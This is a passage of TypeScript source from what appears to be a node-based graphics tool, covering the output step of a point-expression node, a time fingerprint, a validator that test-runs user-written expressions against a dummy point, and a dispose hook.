      const base = gatherPoints(src, keptMap, kept);
      const compactWritten = writtenAttrs
        ? gatherAttributes(writtenAttrs, keptMap, kept)
        : undefined;
      out = copyPointsWith(base, {
        positions: outPos.slice(0, kept * 2),
        scales: outScales.slice(0, kept * 2),
        rotations: outRots.slice(0, kept),
        groupIndices: outGroups ? outGroups.slice(0, kept) : undefined,
        ...(compactWritten
          ? { attributes: { ...base.attributes, ...compactWritten } }
          : {}),
      });
    }
    return { primary: out };
  },

  fingerprintExtras(params, ctx) {
    const src = (params.expression as string) ?? "";
    return TIME_RE.test(src) ? `t:${ctx.time}` : "";
  },

  // AI-recipe gate (graph-validation.ts calls this; it never runs during
  // evaluation). Compile + smoke-run the kernel once against a dummy point so
  // expression code that fails SILENTLY at runtime — a strict-mode
  // ReferenceError from an undeclared temp, or a user `return` replacing the
  // packed result — comes back as a repairable validation error instead of a
  // recipe that quietly does nothing.
  validateParams(params) {
    const raw = params.expression;
    if (raw !== undefined && typeof raw !== "string")
      return ["expression must be a string of JavaScript."];
    const target = ((params.target as string) ?? "points") as ExprTarget;
    const compiled = compile(raw ?? "", target);
    if (!compiled.fn)
      return [`expression does not compile: ${compiled.error ?? "unknown error"}`];
    const pt: PointCtx | AnchorCtx =
      target === "spline anchors"
        ? {
            index: 0,
            count: 1,
            subpath: 0,
            groupIndex: 0,
            px: 0.5,
            py: 0.5,
            inx0: 0,
            iny0: 0,
            outx0: 0,
            outy0: 0,
            width0: 1,
          }
        : {
            index: 0,
            count: 1,
            groupIndex: 0,
            px: 0.5,
            py: 0.5,
            rot0: 0,
            sx0: 1,
            sy0: 1,
          };
    const writables =
      target === "spline anchors"
        ? "x, y, inx, iny, outx, outy, width, keep"
        : "x, y, rot, sx, sy, scale, keep";
    try {
      const env = makeEnv(
        { time: 0, frame: 0, fps: 60 } as RenderContext,
        "validate",
        makePathEnv(null, null),
        {},
        NO_ATTRS
      );
      const result = compiled.fn(env, pt);
      if (!Array.isArray(result) || result.length !== tupleLenFor(target))
        return [
          "expression must use assignments (x = …, y = …, keep = …), not `return` — a returned value replaces the element outputs and the expression does nothing.",
        ];
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e);
      return [
        `expression throws when run (${msg}) — declare temporaries with let/const and assign to the writable outputs ${writables}.`,
      ];
    }
    return [];
  },

  dispose(ctx, nodeId) {
    delete ctx.state[`point-expression:${nodeId}`];
  },
};
